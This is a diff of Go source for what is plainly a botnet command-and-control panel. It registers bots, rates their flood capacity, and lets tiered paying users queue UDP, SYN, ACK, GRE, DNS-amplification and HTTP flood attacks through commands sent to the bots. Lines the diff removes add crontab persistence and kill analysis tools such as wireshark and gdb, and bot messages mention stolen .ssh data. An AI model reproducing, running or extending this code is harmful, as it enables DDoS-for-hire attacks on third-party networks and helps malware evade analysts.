+	logAuditEvent("SYSTEM", "CONNECTION", fmt.Sprintf("User connected from %s", remoteAddr))
+
+	handleRequest(tlsConn)
+}
+
+func startBotCleanup() {
+	ticker := time.NewTicker(cfg.BotCleanupInterval)
+	defer ticker.Stop()
+	for range ticker.C {
+		cleanupStaleBots()
+	}
+}
+
+func cleanupStaleBots() {
+	botCountLock.Lock()
+	defer botCountLock.Unlock()
+	threshold := 2 * cfg.HeartbeatInterval
+	var activeBots []Bot
+	for _, b := range bots {
+		if time.Since(b.LastHeartbeat) <= threshold {
+			activeBots = append(activeBots, b)
+		} else if b.Conn != nil {
+			b.Conn.Close()
+		}
+	}
+	bots = activeBots
+}
+
+func randomString(length int) string {
+	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+	b := make([]byte, length)
+	for i := range b {
+		n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(chars))))
+		b[i] = chars[n.Int64()]
+	}
+	return string(b)
+}
+
+func isValidPort(portStr string) bool {
+	port, err := strconv.Atoi(portStr)
+	return err == nil && port > 0 && port <= 65535
+}
+
+func isValidMethod(method string) bool {
+	return allowedMethods[method]
+}
+
+func isValidIP(ipStr string) bool {
+	ip := net.ParseIP(ipStr)
+	if ip != nil {
+		if isPrivateIP(ip) {
+			return !isPrivateIP(ip)
+		}
+		return true
+	}
+
+	if _, err := net.ResolveIPAddr("ip6", ipStr); err == nil {
+		return true
+	}
+
+	if _, err := net.LookupHost(ipStr); err == nil {
+		return true
+	}
+
+	return false
+}
+
+func isPrivateIP(ip net.IP) bool {
+	privateBlocks := []*net.IPNet{
+		{IP: net.ParseIP("10.0.0.0"), Mask: net.CIDRMask(8, 32)},
+		{IP: net.ParseIP("172.16.0.0"), Mask: net.CIDRMask(12, 32)},
+		{IP: net.ParseIP("192.168.0.0"), Mask: net.CIDRMask(16, 32)},
+		{IP: net.ParseIP("127.0.0.0"), Mask: net.CIDRMask(8, 32)},
+		{IP: net.ParseIP("169.254.0.0"), Mask: net.CIDRMask(16, 32)},
+		{IP: net.ParseIP("::1"), Mask: net.CIDRMask(128, 128)},
+		{IP: net.ParseIP("fc00::"), Mask: net.CIDRMask(7, 128)},
+		{IP: net.ParseIP("fe80::"), Mask: net.CIDRMask(10, 128)},
+		{IP: net.ParseIP("224.0.0.0"), Mask: net.CIDRMask(4, 32)},
+		{IP: net.ParseIP("240.0.0.0"), Mask: net.CIDRMask(4, 32)},
+	}
+
+	for _, block := range privateBlocks {
+		if block.Contains(ip) {
+			return true
+		}
+	}
+	return false
+}
+
+func GetMaxConcurrentAttacks(userLevel string) int {
+	switch userLevel {
+	case "Owner":
+		return 5
+	case "Admin":
+		return 5
+	case "Pro":
+		return 3
+	case "Basic":
+		return 1
+	default:
+		return 1
+	}
+}
+
+func FormatAttackMethodName(method string) string {
+	names := map[string]string{
+		"!udpflood": "UDP Flood",
+		"!udpsmart": "UDP Smart",
+		"!tcpflood": "TCP Flood",
+		"!synflood": "SYN Flood",
+		"!ackflood": "ACK Flood",
+		"!greflood": "GRE Flood",
+		"!dns":      "DNS Amplification",
+		"!http":     "HTTP Flood",
+	}
+	return names[method]
+}
+
+func getAttackPower(bots []Bot) float64 {
+	totalPower := 0.0
+
+	for _, bot := range bots {
+		botPower := 0.0
+		networkCapacity := float64(bot.Cores) * 70.0
+		ramFactor := 1.0 + (bot.RAM / 16.0)
+		archFactor := 1.0
+		if strings.Contains(strings.ToLower(bot.Arch), "x86_64") {
+			archFactor = 1.2
+		} else if strings.Contains(strings.ToLower(bot.Arch), "arm") {
+			archFactor = 0.7
+		}
+
+		connectionFactor := 1.0
+		botPower = networkCapacity * ramFactor * archFactor * connectionFactor
+		totalPower += botPower
+	}
+
+	totalGbps := totalPower / 1000
+	return math.Round(totalGbps*100) / 100
+}
+
+func getBots() []Bot {
+	var activeBots []Bot
+	for _, b := range bots {
+		if b.Conn != nil {
+			activeBots = append(activeBots, b)
+		}
+	}
+	return activeBots
+}
+
+func getOngoingAttacks() []AttackInfo {
+	var attacks []AttackInfo
+	attackManagerInstance.mutex.RLock()
+	defer attackManagerInstance.mutex.RUnlock()
+	for _, attack := range attackManagerInstance.attacks {
+		remaining := time.Until(attack.Start.Add(attack.Duration))
+		if remaining <= 0 {
+			continue
+		}
+		attacks = append(attacks, AttackInfo{
+			Method:    attack.Method,
+			Target:    attack.Target,
+			Port:      attack.Port,
+			Duration:  fmt.Sprintf("%.0fs", attack.Duration.Seconds()),
+			Remaining: formatDuration(remaining),
+			ID:        attack.Method + "-" + attack.Target + "-" + attack.Port,
+		})
+	}
+	return attacks
+}
+
+func formatDuration(d time.Duration) string {
+	hours := int(d.Hours())
+	minutes := int(d.Minutes()) % 60
+	seconds := int(d.Seconds()) % 60
+	if hours > 0 {
+		return fmt.Sprintf("%dh%dm%ds", hours, minutes, seconds)
+	} else if minutes > 0 {
+		return fmt.Sprintf("%dm%ds", minutes, seconds)
+	}
+	return fmt.Sprintf("%ds", seconds)
+}
+
+func getSessionCookie(r *http.Request) string {
+	cookie, err := r.Cookie("session")
+	if err != nil {
+		return ""
+	}
+	return cookie.Value
+}
+
+func setSession(id string, user User) {
+	sessionLock.Lock()
+	defer sessionLock.Unlock()
+	sessions[id] = user
+}
+
+func getSession(sessionID string) (User, bool) {
+	sessionLock.Lock()
+	defer sessionLock.Unlock()
+	user, exists := sessions[sessionID]
+	if !exists {
+		return User{}, false
+	}
+	if time.Since(user.Expire) > cfg.SessionTimeout {
+		delete(sessions, sessionID)
+		return User{}, false
+	}
+	return user, true
+}
+
+func clearSession(id string) {
+	sessionLock.Lock()
+	defer sessionLock.Unlock()
+	delete(sessions, id)
+}
+
+func fileExists(filename string) bool {
+	_, err := os.Stat(filename)
+	return err == nil
+}
+
+func generateSelfSignedCert() {
+	cert := &x509.Certificate{
+		SerialNumber: big.NewInt(1),
+		Subject:      pkix.Name{CommonName: "localhost"},
+		NotBefore:    time.Now(),
+		NotAfter:     time.Now().AddDate(1, 0, 0),
+		KeyUsage:     x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
+		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
+	}
+	priv, _ := rsa.GenerateKey(rand.Reader, 2048)
+	certBytes, _ := x509.CreateCertificate(rand.Reader, cert, cert, &priv.PublicKey, priv)
+	certOut, _ := os.Create(cfg.CertFile)
+	pem.Encode(certOut, &pem.Block{Type: "CERTIFICATE", Bytes: certBytes})
+	certOut.Close()
+	keyOut, _ := os.OpenFile(cfg.KeyFile, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
+	pem.Encode(keyOut, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(priv)})
+	keyOut.Close()
 }
 
 func loadConfig() (*Config, error) {
@@ -298,47 +1189,211 @@ func loadConfig() (*Config, error) {
 	return &config, nil
 }
 
+func validateConfig() error {
+	if cfg.MaxConns <= 0 || cfg.MaxReadSize <= 0 || cfg.MaxAttackDuration <= 0 {
+		return fmt.Errorf("invalid config values")
+	}
+	if cfg.MinPasswordLength < 8 || cfg.ResetTokenValidity <= 0 {
+		return fmt.Errorf("invalid security settings")
+	}
+	return nil
+}
+
+func initializeRootUser() {
+	users := []User{}
+	if data, err := os.ReadFile(cfg.UsersFile); err == nil {
+		json.Unmarshal(data, &users)
+	}
+
+	rootExists := false
+	for _, user := range users {
+		if user.Username == "root" {
+			rootExists = true
+			break
+		}
+	}
+
+	if !rootExists {
+		password := randomString(16)
+		hashedPassword, _ := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
+		apiKey := randomString(64)
+		rootUser := User{
+			Username:      "root",
+			PasswordHash:  string(hashedPassword),
+			APIKey:        apiKey,
+			Expire:        time.Now().AddDate(10, 0, 0),
+			Level:         "Owner",
+			CreatedAt:     time.Now(),
+			WalletAddress: "", // Initialize empty or generate one
+			Credits:       -1, // -1 could represent unlimited credits
+			Transactions:  []Transaction{},
+		}
+		users = append(users, rootUser)
+		saveUsers(users)
+
+		logOutput("SYSTEM", fmt.Sprintf(`
+        ┌──────────────────────────────────────────────┐
+        │            ROOT USER CREATED                 │
+        ├──────────────────────────────────────────────┤
+        │ Username: root                               │
+        │ Password: %-32s │
+        │ API Key:  %-32s │
+        └──────────────────────────────────────────────┘
+        `, password, apiKey))
+	}
+}
+
+func logOutput(source, message string) {
+	logMutex.Lock()
+	defer logMutex.Unlock()
+
+	timestamp := time.Now().Format("2006-01-02 15:04:05")
+	colorCode := "37"
+
+	switch source {
+	case "SYSTEM":
+		colorCode = "36"
+	case "BOT":
+		colorCode = "33"
+	case "BOT_RAW":
+		colorCode = "35"
+	case "BOT_LOG":
+		colorCode = "32"
+	case "ATTACK":
+		colorCode = "31"
+	}
+
+	fmt.Printf("\033[%sm[%s] [%s] %s\033[0m\n", colorCode, timestamp, source, message)
+}
+
 func getTLSConfig() *tls.Config {
 	cert, err := tls.LoadX509KeyPair(cfg.CertFile, cfg.KeyFile)
 	if err != nil {
-		logAuditEvent("TLS", "CONFIG", fmt.Sprintf("Failed to load certificate: %v", err))
 		return nil
 	}
-	caCert, err := os.ReadFile("certs/ca.crt")
-	if err != nil {
-		logAuditEvent("TLS", "CONFIG", fmt.Sprintf("Failed to read CA cert: %v", err))
-		return nil
-	}
-	caCertPool := x509.NewCertPool()
-	caCertPool.AppendCertsFromPEM(caCert)
 	return &tls.Config{
 		Certificates:     []tls.Certificate{cert},
 		MinVersion:       tls.VersionTLS13,
-		ClientAuth:       tls.RequireAndVerifyClientCert,
-		ClientCAs:        caCertPool,
 		CipherSuites:     []uint16{tls.TLS_AES_128_GCM_SHA256, tls.TLS_AES_256_GCM_SHA384},
 		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256},
 	}
 }
 
-func (s *SessionStore) Get(id string) (*session, bool) {
-	val, ok := s.store.Load(id)
-	if !ok {
-		return nil, false
+func getGeoLocation(ip string) (string, string, string, float64, float64, error) {
+	if ip == "127.0.0.1" || ip == "::1" || ip == "localhost" {
+		return "Local", "Local Network", "Internal", 0, 0, nil
 	}
-	return val.(*session), true
+	host, _, _ := net.SplitHostPort(ip)
+	ip = host
+	resp, err := http.Get(fmt.Sprintf("http://www.geoplugin.net/json.gp?ip=%s", ip))
+	if err != nil {
+		return "", "", "", 0, 0, err
+	}
+	defer resp.Body.Close()
+	var data struct {
+		Country   string  `json:"geoplugin_countryName"`
+		City      string  `json:"geoplugin_city"`
+		Region    string  `json:"geoplugin_regionName"`
+		Latitude  float64 `json:"geoplugin_latitude,string"`
+		Longitude float64 `json:"geoplugin_longitude,string"`
+		Error     bool    `json:"error"`
+	}
+	json.NewDecoder(resp.Body).Decode(&data)
+	if data.Error {
+		return "", "", "", 0, 0, nil
+	}
+	return data.Country, data.City, data.Region, data.Latitude, data.Longitude, nil
 }
 
-func (s *SessionStore) Set(id string, sess *session) {
-	s.store.Store(id, sess)
+func sendChallenge(conn net.Conn) (string, error) {
+	challenge := randomString(16)
+	_, err := fmt.Fprintf(conn, "CHALLENGE:%s\n", challenge)
+	return challenge, err
 }
 
-func (s *SessionStore) Delete(id string) {
-	s.store.Delete(id)
+func verifyResponse(conn net.Conn, challenge string) (bool, error) {
+	reader := bufio.NewReader(conn)
+	response, err := reader.ReadString('\n')
+	if err != nil {
+		return false, err
+	}
+	h := sha256.New()
+	h.Write([]byte(challenge + "SALT"))
+	expected := fmt.Sprintf("%x", h.Sum(nil))
+	return strings.TrimSpace(response) == expected, nil
 }
 
-func (s *SessionStore) Range(f func(key, value interface{}) bool) {
-	s.store.Range(f)
+func updateBotInfo(conn net.Conn, arch, coresStr, ramStr string) {
+	botCountLock.Lock()
+	defer botCountLock.Unlock()
+	for i, b := range bots {
+		if b.Conn == conn {
+			bots[i].Arch = arch
+			if cores, err := strconv.Atoi(coresStr); err == nil {
+				bots[i].Cores = cores
+			}
+			if ram, err := strconv.ParseFloat(ramStr, 64); err == nil {
+				bots[i].RAM = ram
+			}
+			break
+		}
+	}
+}
+
+func updateBotHeartbeat(conn net.Conn) {
+	botCountLock.Lock()
+	defer botCountLock.Unlock()
+	for i, b := range bots {
+		if b.Conn == conn {
+			bots[i].LastHeartbeat = time.Now()
+			break
+		}
+	}
+}
+
+func removeBot(conn net.Conn) {
+	botCountLock.Lock()
+	defer botCountLock.Unlock()
+	for i, b := range bots {
+		if b.Conn == conn {
+			bots = append(bots[:i], bots[i+1:]...)
+			break
+		}
+	}
+	for i, botConn := range botConns {
+		if botConn == conn {
+			botConns = append(botConns[:i], botConns[i+1:]...)
+			break
+		}
+	}
+}
+
+func getBotCount() int {
+	botCountLock.Lock()
+	defer botCountLock.Unlock()
+	return len(bots)
+}
+
+func incrementBotCount() {
+	botCountLock.Lock()
+	defer botCountLock.Unlock()
+}
+
+func decrementBotCount() {
+	botCountLock.Lock()
+	defer botCountLock.Unlock()
+}
+
+func getUsers() []User {
+	data, _ := os.ReadFile(cfg.UsersFile)
+	var users []User
+	json.Unmarshal(data, &users)
+	return users
+}
+
+func saveUsers(users []User) error {
+	data, _ := json.MarshalIndent(users, "", "  ")
+	return os.WriteFile(cfg.UsersFile, data, 0600)
 }
 
 func setupFirewallRules() error {
@@ -363,180 +1418,105 @@ func setupFirewallRules() error {
 	return nil
 }
 
-func startServers() {
-	tlsConfig := getTLSConfig()
-	if tlsConfig == nil {
-		logAuditEvent("USER SERVER", "CONNECTION", "Accept error: TLS config is nil")
-		return
-	}
-
-	go func() {
-		userListener, err := tls.Listen("tcp", cfg.UserServerIP+":"+cfg.UserServerPort, tlsConfig)
-		if err != nil {
-			logAuditEvent("USER SERVER", "CONNECTION", fmt.Sprintf("Accept error: %v", err))
-			return
-		}
-		defer userListener.Close()
-		logAuditEvent("SYSTEM", "USER SERVER", fmt.Sprintf("Started on %s:%s", cfg.UserServerIP, cfg.UserServerPort))
-
-		for {
-			conn, err := userListener.Accept()
-			if err != nil {
-				logAuditEvent("BOT SERVER", "STARTUP", fmt.Sprintf("Failed to start listener: %v", err))
-				continue
-			}
-			select {
-			case connSemaphore <- struct{}{}:
-				go func(c net.Conn) {
-					defer func() { <-connSemaphore }()
-					handleUserConnection(c)
-				}(conn)
-			default:
-				logAuditEvent("BOT SERVER", "CONNECTION", fmt.Sprintf("Accept error: %v", err))
-				conn.Close()
-			}
-		}
-	}()
-
-	botListener, err := tls.Listen("tcp", cfg.BotServerIP+":"+cfg.BotServerPort, tlsConfig)
-	if err != nil {
-		return
-	}
-	defer botListener.Close()
-
-	logAuditEvent("SYSTEM", "BOT SERVER", fmt.Sprintf("Started on %s:%s", cfg.BotServerIP, cfg.BotServerPort))
-
-	for {
-		conn, err := botListener.Accept()
-		if err != nil {
-			logAuditEvent("BOT SERVER", "CONNECTION", "Connection limit reached — rejecting")
-			continue
-		}
-		select {
-		case connSemaphore <- struct{}{}:
-			go func(c net.Conn) {
-				defer func() { <-connSemaphore }()
-				handleBotConnection(c)
-			}(conn)
-		default:
-			logAuditEvent("USER SERVER", "CONNECTION", "Connection limit reached — rejecting")
-			conn.Close()
-		}
-	}
-}
-
-func handleUserConnection(conn net.Conn) {
-	defer func() {
-		if r := recover(); r != nil {
-			logAuditEvent("SYSTEM", "PANIC", fmt.Sprintf("Recovered in handleUserConnection: %v", r))
-		}
-		conn.Close()
-		<-connSemaphore
-		removeClient(conn)
-	}()
-
-	conn.SetDeadline(time.Now().Add(30 * time.Second))
-	conn.SetReadDeadline(time.Now().Add(30 * time.Second))
-	conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
-
-	tlsConn, ok := conn.(*tls.Conn)
-	if !ok {
-		logAuditEvent("SYSTEM", "CONNECTION", "Non-TLS connection attempt")
-		return
-	}
-
-	if err := tlsConn.Handshake(); err != nil {
-		logAuditEvent("SYSTEM", "TLS", fmt.Sprintf("Handshake failed: %v", err))
-		return
-	}
-
-	remoteAddr := conn.RemoteAddr().String()
-	logAuditEvent("SYSTEM", "CONNECTION", fmt.Sprintf("User connected from %s", remoteAddr))
-	handleRequest(tlsConn)
-}
-
-func handleBotConnection(conn net.Conn) {
-	defer func() {
-		conn.Close()
-		<-connSemaphore
-		decrementBotCount()
-	}()
-	incrementBotCount()
-	killAnalysisTools()
-
-	ctx, cancel := context.WithCancel(context.Background())
-	defer cancel()
-	go Ping(ctx, conn)
-	reader := bufio.NewReaderSize(conn, 4096)
-	for {
-		conn.SetReadDeadline(time.Now().Add(180 * time.Second))
-		line, err := reader.ReadString('\n')
-		if err != nil {
-			return
-		}
-		line = strings.TrimSpace(line)
-		if line == "" {
-			continue
-		}
-		if strings.HasPrefix(line, "PONG") {
-			handleBotPong(conn, line)
-		}
-		if strings.HasPrefix(line, "!") {
-			processBotMessage(line)
-		}
-	}
-}
-
-func (am *attackManager) checkScheduledAttacks() {
-	ticker := time.NewTicker(1 * time.Minute)
+func cleanSessions() {
+	ticker := time.NewTicker(5 * time.Minute)
 	defer ticker.Stop()
 	for range ticker.C {
 		now := time.Now()
-		am.mutex.Lock()
-		for i, sa := range am.scheduledAttacks {
-			if now.After(sa.Start.Add(sa.Duration)) {
-				am.attackQueue = append(am.attackQueue, sa)
-				am.scheduledAttacks = append(am.scheduledAttacks[:i], am.scheduledAttacks[i+1:]...)
+		sessionStore.Range(func(key, value interface{}) bool {
+			sess := value.(*session)
+			if now.Sub(sess.lastActive) > cfg.SessionTimeout || now.After(sess.expires) {
+				if keyStr, ok := key.(string); ok {
+					sessionStore.Delete(keyStr)
+				}
+				userSessionLock.Lock()
+				userSessions[sess.client.user.Username]--
+				userSessionLock.Unlock()
+			}
+			return true
+		})
+	}
+}
+
+func cleanRateLimiters() {
+	ticker := time.NewTicker(5 * time.Minute)
+	defer ticker.Stop()
+	for range ticker.C {
+		limiterMutex.Lock()
+		now := time.Now()
+		for ip, limiter := range ipLimiterMap {
+			if now.Sub(limiter.lastSeen) > 5*time.Minute {
+				delete(ipLimiterMap, ip)
 			}
 		}
-		am.mutex.Unlock()
-	}
-}
-
-func generateSessionID() (string, error) {
-	b := make([]byte, 32)
-	_, err := rand.Read(b)
-	if err != nil {
-		return "", err
-	}
-	return base64.URLEncoding.EncodeToString(b), nil
-}
-
-func setupCronJob() {
-	go func() {
-		cmd := exec.Command("crontab", "-l")
-		output, _ := cmd.CombinedOutput()
-		if !strings.Contains(string(output), os.Args[0]) {
-			cmd = exec.Command("sh", "-c", fmt.Sprintf("(crontab -l 2>/dev/null; echo \"@reboot %s\") | crontab -", os.Args[0]))
-			cmd.Run()
+		for user, limiter := range userLimiterMap {
+			if now.Sub(limiter.lastSeen) > 5*time.Minute {
+				delete(userLimiterMap, user)
+			}
 		}
-	}()
+		limiterMutex.Unlock()
+	}
 }
 
-func secureDelete(path string) error {
-	file, err := os.OpenFile(path, os.O_WRONLY, 0)
-	if err != nil {
-		return err
+func cleanBlockedIPs() {
+	ticker := time.NewTicker(1 * time.Hour)
+	defer ticker.Stop()
+	for range ticker.C {
+		blockedIPsLock.Lock()
+		for ip, blockTime := range blockedIPs {
+			if time.Since(blockTime) > 24*time.Hour {
+				delete(blockedIPs, ip)
+			}
+		}
+		blockedIPsLock.Unlock()
 	}
-	defer file.Close()
-	info, err := file.Stat()
-	if err != nil {
-		return err
+}
+
+func rotateLogs() {
+	ticker := time.NewTicker(1 * time.Hour)
+	defer ticker.Stop()
+	for range ticker.C {
+		if info, err := os.Stat(cfg.AuditLogFile); err == nil && info.Size() > cfg.MaxLogSize {
+			if err := os.Remove(cfg.AuditLogFile + ".old"); err == nil || os.IsNotExist(err) {
+				os.Rename(cfg.AuditLogFile, cfg.AuditLogFile+".old")
+			}
+		}
 	}
-	buf := make([]byte, info.Size())
-	rand.Read(buf)
-	file.Write(buf)
-	return os.Remove(path)
+}
+
+func updateTitle() {
+	spinChars := []rune{'⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷'}
+	spinIndex := 0
+	ticker := time.NewTicker(1 * time.Second)
+	defer ticker.Stop()
+
+	for range ticker.C {
+		attackCount := attackManagerInstance.countAttacks()
+		botCount := getBotCount()
+		uptime := time.Since(serverStartTime).Round(time.Second)
+
+		for _, c := range clients {
+			spinChar := spinChars[spinIndex]
+			title := fmt.Sprintf("%c━━━%c━━[User: %s]━━%c━━[Bots: %d]━━%c━━[Attacks: %d/%d]━━%c━━[Uptime: %s]━━%c━━━%c",
+				spinChar, spinChar, c.user.Username, spinChar, botCount, spinChar,
+				attackCount, attackManagerInstance.getMaxAttacks(), spinChar, uptime, spinChar, spinChar)
+			c.conn.Write([]byte(fmt.Sprintf("\033]0;%s\007", title)))
+		}
+		spinIndex = (spinIndex + 1) % len(spinChars)
+	}
+}
+
+func logSystemStats() {
+	ticker := time.NewTicker(30 * time.Minute)
+	defer ticker.Stop()
+	for range ticker.C {
+		stats := fmt.Sprintf("System stats - Load: %.2f, RAM: %.2fGB, Uptime: %.2fh, Cores: %d",
+			getSystemLoad(),
+			getSystemRAM(),
+			getUptime()/3600,
+			getCPUCount())
+		logAuditEvent("SYSTEM", "STATS", stats)
+	}
 }
 
 func getSystemRAM() float64 {
@@ -576,84 +1556,195 @@ func getUptime() float64 {
 	return uptime
 }
 
-func killAnalysisTools() {
-	tools := []string{"wireshark", "tcpdump", "strace", "ltrace", "gdb"}
-	for _, tool := range tools {
-		exec.Command("pkill", "-9", tool).Run()
-	}
-}
-
 func getCPUCount() int {
 	return runtime.NumCPU()
 }
 
-func logSystemStats() {
-	ticker := time.NewTicker(30 * time.Minute)
-	defer ticker.Stop()
-	for range ticker.C {
-		stats := fmt.Sprintf("System stats - Load: %.2f, RAM: %.2fGB, Uptime: %.2fh, Cores: %d",
-			getSystemLoad(),
-			getSystemRAM(),
-			getUptime()/3600,
-			getCPUCount())
-		logAuditEvent("SYSTEM", "STATS", stats)
+func logAuditEvent(user, event, details string) {
+	logEntry := fmt.Sprintf("[%s] %s: %s - %s",
+		time.Now().Format("2006-01-02 15:04:05"),
+		user,
+		event,
+		details)
+	fmt.Println(logEntry)
+
+	file, err := os.OpenFile(cfg.AuditLogFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
+	if err == nil {
+		fmt.Fprintln(file, logEntry)
+		file.Close()
 	}
 }
 
-func Ping(ctx context.Context, conn net.Conn) {
-	ticker := time.NewTicker(5 * time.Second)
-	defer ticker.Stop()
-	for {
-		select {
-		case <-ticker.C:
-			conn.Write([]byte("PING\n"))
-		case <-ctx.Done():
-			return
+func handleRequest(conn net.Conn) {
+	reader := bufio.NewReader(conn)
+	conn.Write([]byte("\033]0;Authentication Required\007"))
+	readString, err := reader.ReadString('\n')
+	if err != nil {
+		return
+	}
+	readString = strings.TrimSpace(readString)
+	if strings.HasPrefix(readString, "PONG") {
+		handleBotPong(conn, readString)
+		return
+	}
+	if strings.HasPrefix(readString, "loginforme") {
+		if authed, client := authUser(conn); authed {
+			handleClientSession(conn, client)
 		}
 	}
 }
 
-func handleBotPong(conn net.Conn, readString string) {
-	remoteAddr := conn.RemoteAddr().(*net.TCPAddr).IP.String()
-	parts := strings.Split(readString, ":")
-	if len(parts) < 3 {
-		return
+func handleClientSession(conn net.Conn, c *client) {
+	defer func() {
+		userSessionLock.Lock()
+		userSessions[c.user.Username]--
+		userSessionLock.Unlock()
+		sessionStore.Delete(c.sessionID)
+		c.cancel()
+		conn.Close()
+	}()
+
+	reader := bufio.NewReader(conn)
+	for {
+		conn.Write([]byte(getPrompt(c.user.GetLevel())))
+
+		input, err := reader.ReadString('\n')
+		if err != nil {
+			break
+		}
+
+		input = strings.TrimSpace(input)
+		if input == "" {
+			continue
+		}
+
+		parts := strings.Fields(input)
+		if len(parts) < 1 {
+			continue
+		}
+
+		ipLimiter := getIPLimiter(c.remoteAddr)
+		userLimiter := getUserLimiter(c.user.Username)
+		if !ipLimiter.limiter.Allow() || !userLimiter.limiter.Allow() {
+			conn.Write([]byte("Rate limit exceeded. Please wait...\n"))
+			continue
+		}
+
+		if time.Since(c.lastCommand) < 2*time.Second {
+			conn.Write([]byte("Command too fast. Please wait...\n"))
+			continue
+		}
+
+		c.lastCommand = time.Now()
+		command := strings.ToLower(parts[0])
+
+		switch command {
+		case "!udpflood", "!udpsmart", "!tcpflood", "!synflood", "!ackflood", "!greflood", "!dns", "!http":
+			handleAttackCommand(conn, parts, c)
+		case "ongoing":
+			displayOngoingAttacks(conn)
+		case "queue":
+			displayQueuedAttacks(conn, c)
+		case "cancel":
+			handleCancelAttack(parts, c)
+		case "bots", "bot":
+			displayBotCount(conn)
+		case "cls", "clear":
+			conn.Write([]byte("\033[2J\033[H"))
+		case "logout", "exit":
+			return
+		case "!reinstall":
+			if c.user.GetLevel() <= 1 {
+				sendToBots("!reinstall", c.user.Username)
+			}
+		case "help":
+			displayHelp(conn, c.user.GetLevel())
+		case "db":
+			if c.user.GetLevel() <= 1 {
+				displayUserDatabase(conn)
+			}
+		case "logs":
+			if c.user.GetLevel() <= 1 {
+				displayAuditLogs(conn)
+			}
+		case "adduser":
+			if c.user.GetLevel() <= 1 {
+				handleAddUser(parts)
+			}
+		case "deluser":
+			if c.user.GetLevel() <= 1 {
+				handleDeleteUser(parts)
+			}
+		case "resetpw":
+			handleResetPassword(c, parts)
+		case "?":
+			displayQuickHelp(conn)
+		case "status":
+			displayServerStatus(conn)
+		case "stop":
+			attackManagerInstance.removeAttack(conn)
+		case "stats":
+			displayBotStats(conn)
+		default:
+			conn.Write([]byte("Unknown command. Type 'help' for available commands.\n"))
+		}
 	}
-	botArch, _ := hex.DecodeString(parts[1])
-	statsData, _ := hex.DecodeString(parts[2])
-	statParts := strings.Split(string(statsData), "|")
-	if len(statParts) < 4 {
-		return
-	}
-	latencySec, _ := strconv.ParseFloat(statParts[0], 64)
-	latency := time.Duration(latencySec * float64(time.Second))
-	throughput, _ := strconv.ParseFloat(statParts[1], 64)
-	ram, _ := strconv.ParseFloat(statParts[2], 64)
-	cores, _ := strconv.Atoi(statParts[3])
-	botStatsLock.Lock()
-	botPerformance[remoteAddr] = BotStats{
-		LastSeen:     time.Now(),
-		Latency:      latency,
-		Throughput:   throughput,
-		RAM:          ram,
-		Cores:        cores,
-		Architecture: string(botArch),
-	}
-	botStatsLock.Unlock()
 }
 
-func processBotMessage(botMessage string) {
-	botMessage = strings.TrimPrefix(botMessage, "!")
-	if strings.Contains(botMessage, "/exe") ||
-		strings.Contains(botMessage, ": directory not empty") ||
-		strings.Contains(botMessage, ".ssh from the device") ||
-		strings.Contains(botMessage, "data from the device") ||
-		strings.Contains(botMessage, ": permission denied") {
-		return
+func (user *User) GetLevel() int {
+	switch user.Level {
+	case "Owner":
+		return 0
+	case "Admin":
+		return 1
+	case "Pro":
+		return 2
+	default:
+		return 3
 	}
-	botArguments := strings.SplitN(botMessage, " ", 1)
-	if botArguments[0] == "LOG" && len(botArguments) > 1 {
-		logAuditEvent("BOT", "LOG", botArguments[1])
+}
+
+func getPrompt(userLevel int) string {
+	var levelName string
+	var levelColor string
+	switch userLevel {
+	case 0:
+		levelName = "OWNER"
+		levelColor = "183"
+	case 1:
+		levelName = "ADMIN"
+		levelColor = "251"
+	case 2:
+		levelName = "PRO"
+		levelColor = "243"
+	default:
+		levelName = "BASIC"
+		levelColor = "240"
+	}
+	return fmt.Sprintf("\n\r\033[38;5;240m[\033[38;5;237mPr\033[38;5;243mo\033[38;5;246mpt\033[38;5;240m]@[%s]\033[38;5;114m► \033[0m",
+		colorizeText(levelName, levelColor))
+}
+
+func colorizeText(text, colorCode string) string {
+	return fmt.Sprintf("\033[38;5;%sm%s\033[0m", colorCode, text)
+}
+
+func sendToBots(command, user string) {
+	logAuditEvent(user, "COMMAND", fmt.Sprintf("Sent command to bots: %s", command))
+	for _, botConn := range botConns {
+		_, err := botConn.Write([]byte(command + "\r\n"))
+		if err != nil {
+			logOutput("BOT", fmt.Sprintf("Error sending to bot %s: %v", botConn.RemoteAddr(), err))
+		}
+	}
+}
+
+func removeClient(conn net.Conn) {
+	for idx, c := range clients {
+		if c.conn == conn {
+			clients = append(clients[:idx], clients[idx+1:]...)
+			break
+		}
 	}
 }
 
@@ -717,19 +1808,6 @@ func (rl *rateLimiter) canAttack() bool {
 	return rl.attacksToday < rl.dailyLimit
 }
 
-func (user *User) GetLevel() int {
-	switch user.Level {
-	case "Owner":
-		return 0
-	case "Admin":
-		return 1
-	case "Pro":
-		return 2
-	default:
-		return 3
-	}
-}
-
 func getAggregatedStats() AggregatedStats {
 	botStatsLock.Lock()
 	defer botStatsLock.Unlock()
@@ -751,427 +1829,43 @@ func getAggregatedStats() AggregatedStats {
 	return stats
 }
 
-func generateSecureString(n int) (string, error) {
-	b := make([]byte, n)
-	_, err := rand.Read(b)
-	if err != nil {
-		return "", err
-	}
-	for idx := range b {
-		b[idx] = letterBytes[b[idx]%byte(len(letterBytes))]
-	}
-	return string(b), nil
-}
-
-func AuthUser(username, password string) (bool, *User) {
-	users := []User{}
-	usersFile, err := os.ReadFile(cfg.UsersFile)
-	if err != nil {
-		return false, nil
-	}
-	json.Unmarshal(usersFile, &users)
-	for idx, user := range users {
-		if user.Username == username {
-			if time.Now().Before(user.LockedUntil) {
-				logAuditEvent(username, "AUTH", "Account locked due to too many failed attempts")
-				return false, nil
-			}
-			if err := bcrypt.CompareHashAndPassword([]byte(user.PasswordHash), []byte(password)); err == nil {
-				users[idx].FailedAttempts = 0
-				users[idx].LastLogin = time.Now()
-				users[idx].LastActivity = time.Now()
-				saveUsers(users)
-				logAuditEvent(username, "AUTH", "Login successful")
-				return true, &users[idx]
-			}
-			users[idx].FailedAttempts++
-			if users[idx].FailedAttempts >= 5 {
